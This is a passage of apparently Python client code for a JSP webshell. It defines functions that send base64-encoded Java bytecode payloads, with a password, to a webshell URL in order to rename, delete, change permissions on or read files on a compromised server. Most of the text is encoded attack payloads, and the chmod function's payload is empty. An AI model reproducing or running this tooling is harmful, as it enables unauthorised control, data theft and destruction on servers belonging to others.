ZWFtAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABnN0cmluZwEAB2Zvck5hbWUBABFMamF2YS9sYW5nL0NsYXNzOwEABmludm9rZQEABWJ5dGVzAQACW0IBAAhpbnN0YW5jZQEAAnMzAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47BwDDAQATUmVuYW1lRmlsZU9yRGlyQ29kZQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAIcGF0aG5hbWUBAAlwYXRobmFtZTIBAApTb3VyY2VGaWxlAQAJSW5mby5qYXZhDABVAFYBAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwA5wDoDADpAOoBAAE4DABUAFIBAAZiYXNlNjQMAFEAUgEABFVURjgMAFMAUgEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAAMAFUA6wEACC0tLS0tLT58AQAIfDwtLS0tLS0BAAhhcmdwYXRoPQEACGFyZ25hbWU9AQAJdGV4dC9odG1sBwDmDADsAOsHAOUMAO0A6wEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDADuAO8MAPAA8QwA8gDzDAB+AHsMAHoAewwA8AD0DACPAJAMAPUA9gcA9wwA+ADrAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEACUVSUk9SOi8vIAEAA2hleAwAXABdAQAQamF2YS9sYW5nL1N0cmluZwwA+QD6DABVAPsHAPwMAP0A/gwA/wEAAQAEbnVsbAEAEDAxMjM0NTY3ODlBQkNERUYMAQEA8wEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAECAQMMAFUBBAwBBQEGDAEHAQgMAPABCQEAASwMAQoBBAEABVVURi04DADyAO8BAAxqYXZhLnZlcnNpb24HAQsMAQwA7wEAAzEuOQwBDQD+AQAQamF2YS51dGlsLkJhc2U2NAwAhQEOAQAKZ2V0RGVjb2RlcgEAD2phdmEvbGFuZy9DbGFzcwEAEltMamF2YS9sYW5nL0NsYXNzOwwBDwEQAQAQamF2YS9sYW5nL09iamVjdAcBEQwAhwESDAETARQBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyDAEVARYHARcMARgBGQEADGRlY29kZUJ1ZmZlcgEADGphdmEvaW8vRmlsZQwBGgEbAQABMQEABEluZm8BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAApnZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAISgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEABmdldE91dAEAHygpTGphdmF4L3NlcnZsZXQvanNwL0pzcFdyaXRlcjsBABtqYXZheC9zZXJ2bGV0L2pzcC9Kc3BXcml0ZXIBAAVwcmludAEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAGbGVuZ3RoAQADKClJAQAEKEkpVgEABmNoYXJBdAEABChJKUMBAAdpbmRleE9mAQAEKEkpSQEAHChJKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAV3cml0ZQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEACWNvbXBhcmVUbwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEv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'
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()).replace('argname='.encode(), rd.encode()))

    b64src = ree + b64encode(src.encode()).decode()
    b64dst = rf + b64encode(dst.encode()).decode()

    postArg = {password: payload, rc: b64src, rd: b64dst}

    return requestAndResponse(url, postArg, ra, rb)

def deleteFile(url, password, file):
    ra, rb, rc, rd = genRandomStr(4)
    payload = 'yv66vgAAADQBJgoAQgCbBwCcCgACAJ0KAAIAnggAnwkAUgCgCAChCQBSAKIIAKMJAFIApAcApQgApgoACwCnCACoCACpCACqCACrCwCsAK0LAK4ArwsArACvBwCwCgAVAJsLAK4AsQoAFQCyCgAVALMKAFIAtAoAUgC1CgALALYKAFIAtwoACwCzCgACALgKALkAugcAuwgAvAoAIQCzCAC9CgAmAL4HAL8KACYAwAoAJgDBCgDCAMMKACYAxAgAxQgAxgoAJgDHBwDICgAmAMkKAC4AygoAJgDLCgAmAMwKABUAzQgAzgoALgDPCADQCgAuANEIANIKANMA1AgA1QoAJgDWCADXCgA/ANgIANkHANoHANsKAD8A3AcA3QoA3gDfCgBCAOAIAH8HAIoIAOEKAD8A4goA4wDkCADlBwDmCgBLAKcKAEsA5woASwDoCgBLAOkKAEsA6ggA6wcA7AEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEluZm87AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQACZWMBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAtwYWdlQ29udGV4dAEAH0xqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDsBAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAANzYjIBAANzdHIBAARzdHIyAQABcwEADVN0YWNrTWFwVGFibGUHAOwHAN0HAJwHAO0HAO4HAKUHAL8HALsBAAJFQwEASihMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACczIBAAtjaGFyc2V0TmFtZQEACkV4Y2VwdGlvbnMBAAZkZWNvZGUBAAFpAQABSQEAAnM0AQAVYnl0ZUFycmF5T3V0cHV0U3RyZWFtAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABnN0cmluZwEAB2Zvck5hbWUBABFMamF2YS9sYW5nL0NsYXNzOwEABmludm9rZQEABWJ5dGVzAQACW0IBAAhpbnN0YW5jZQEAAnMzAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47BwDIAQATRGVsZXRlRmlsZU9yRGlyQ29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJbGlzdEZpbGVzAQAPW0xqYXZhL2lvL0ZpbGU7AQAIcGF0aG5hbWUBAARmaWxlAQAOTGphdmEvaW8vRmlsZTsHAOYHAJMBAApTb3VyY2VGaWxlAQAJSW5mby5qYXZhDABXAFgBAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwA7wDwDADxAPIBAAE4DABWAFQBAAZiYXNlNjQMAFMAVAEABFVURjgMAFUAVAEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAAMAFcA8wEACC0tLS0tLT58AQAIfDwtLS0tLS0BAAhhcmdwYXRoPQEACXRleHQvaHRtbAcA7gwA9ADzBwDtDAD1APMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA9gCRDAD3APgMAPkA+gwAfwB7DAB6AHsMAPcA+wwAkACRDAD8AP0HAP4MAP8A8wEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAlFUlJPUjovLyABAANoZXgMAF4AXwEAEGphdmEvbGFuZy9TdHJpbmcMAQABAQwAVwECBwEDDAEEAQUMAQYBBwEABG51bGwBABAwMTIzNDU2Nzg5QUJDREVGDAEIAPoBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBCQEKDABXAQsMAQwBDQwBDgEPDAD3ARABAAEsDAERAQsBAAVVVEYtOAwA+QCRAQAMamF2YS52ZXJzaW9uBwESDAETAJEBAAMxLjkMARQBBQEAEGphdmEudXRpbC5CYXNlNjQMAIYBFQEACmdldERlY29kZXIBAA9qYXZhL2xhbmcvQ2xhc3MBABJbTGphdmEvbGFuZy9DbGFzczsMARYBFwEAEGphdmEvbGFuZy9PYmplY3QHARgMAIgBGQwBGgEbAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBHAEdBwEeDAEfASABAAxkZWNvZGVCdWZmZXIBAAxqYXZhL2lvL0ZpbGUMASEBIgwAkgEjDAEkASIMASUA+gEAATEBAARJbmZvAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAGZ2V0T3V0AQAfKClMamF2YXgvc2VydmxldC9qc3AvSnNwV3JpdGVyOwEAG2phdmF4L3NlcnZsZXQvanNwL0pzcFdyaXRlcgEABXByaW50AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAZsZW5ndGgBAAMoKUkBAAQoSSlWAQAGY2hhckF0AQAEKEkpQwEAB2luZGV4T2YBAAQoSSlJAQAcKEkpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABXdyaXRlAQAQamF2YS9sYW5nL1N5c3RlbQEA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'
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()))

    b64file = rd + b64encode(file.encode()).decode()
    postArg = {password: payload, rc: b64file}

    return requestAndResponse(url, postArg, ra, rb)

def chmodFile(url, password, file, mode):
    ra, rb, rc, rd, ree, rf = genRandomStr(6)
    payload = ''
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()).replace('argmode='.encode(), rd.encode()))

    b64file = ree + b64encode(file.encode()).decode()
    b64mode = rf + b64encode(mode.encode()).decode()
    postArg = {password: payload, rc: b64file, rd: b64mode}

    return requestAndResponse(url, postArg, ra, rb)

def readFile(url, password, file):
    ra, rb, rc, rd = genRandomStr(4)
    payload = 'yv66vgAAADQBLAoAQgCdBwCeCgACAJ8KAAIAoAgAoQkAVgCiCACjCQBWAKQIAKUJAFYApgcApwgAqAoACwCpCACqCACrCACsCACtCwCuAK8LALAAsQsArgCxBwCyCgAVAJ0LALAAswoAFQC0CgAVALUKAFYAtgoAVgC3CgALALgKAFYAuQoACwC1CgACALoKALsAvAcAvQgAvgoAIQC1CAC/CgAmAMAHAMEKACYAwgoAJgDDCgDEAMUKACYAxggAxwgAyAoAJgDJBwDKCgAmAMsKAC4AzAoAJgDNCgAmAM4KABUAzwgA0AoALgDRCADSCgAuANMIANQKANUA1ggA1woAJgDYCADZCgA/ANoIANsHANwHAN0KAD8A3gcA3woA4ADhCgBCAOIIAIMHAI4IAOMKAD8A5AoA5QDmCADnBwDoBwDpBwDqBwDrCgBOAKkKAE0A7AoATADtCgBLAO4KAEsA7wgA8AoASwDxBwDyAQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAMcmFuZG9tUHJlZml4AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMSW5mbzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAJlYwEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAC3BhZ2VDb250ZXh0AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEAA3NiMgEAA3N0cgEABHN0cjIBAAFzAQANU3RhY2tNYXBUYWJsZQcA8gcA3wcAngcA8wcA9AcApwcAwQcAvQEAAkVDAQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJzMgEAC2NoYXJzZXROYW1lAQAKRXhjZXB0aW9ucwEABmRlY29kZQEAAWkBAAFJAQACczQBABVieXRlQXJyYXlPdXRwdXRTdHJlYW0BAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAGc3RyaW5nAQAHZm9yTmFtZQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAGaW52b2tlAQAFYnl0ZXMBAAJbQgEACGluc3RhbmNlAQACczMBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsHAMoBAAxSZWFkRmlsZUNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACHBhdGhuYW1lAQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lBwDoAQAKU291cmNlRmlsZQEACUluZm8uamF2YQwAWwBcAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQMAPUA9gwA9wD4AQABOAwAWgBYAQAGYmFzZTY0DABXAFgBAARVVEY4DABZAFgBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABbAPkBAAgtLS0tLS0+fAEACHw8LS0tLS0tAQAIYXJncGF0aD0BAAl0ZXh0L2h0bWwHAPQMAPoA+QcA8wwA+wD5AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAPwAlQwA/QD+DAD/AQAMAIMAfwwAfgB/DAD9AQEMAJQAlQwBAgEDBwEEDAEFAPkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAJRVJST1I6Ly8gAQADaGV4DABiAGMBABBqYXZhL2xhbmcvU3RyaW5nDAEGAQcMAFsBCAcBCQwBCgELDAEMAQ0BAARudWxsAQAQMDEyMzQ1Njc4OUFCQ0RFRgwBDgEAAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAQ8BEAwAWwERDAESARMMARQBFQwA/QEWAQABLAwBFwERAQAFVVRGLTgMAP8AlQEADGphdmEudmVyc2lvbgcBGAwBGQCVAQADMS45DAEaAQsBABBqYXZhLnV0aWwuQmFzZTY0DACKARsBAApnZXREZWNvZGVyAQAPamF2YS9sYW5nL0NsYXNzAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAEcAR0BABBqYXZhL2xhbmcvT2JqZWN0BwEeDACMAR8MASABIQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIMASIBIwcBJAwBJQEmAQAMZGVjb2RlQnVmZmVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIBABdqYXZhL2lvL0ZpbGVJbnB1dFN0cmVhbQEADGphdmEvaW8vRmlsZQwAWwEnDABbASgMAFsBKQwBKgEAAQACDQoMASsAXAEABEluZm8BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAApnZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAISgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAZnZXRPdXQBAB8oKUxqYXZheC9zZXJ2bGV0L2pzcC9Kc3BXcml0ZXI7AQAbamF2YXgvc2VydmxldC9qc3Av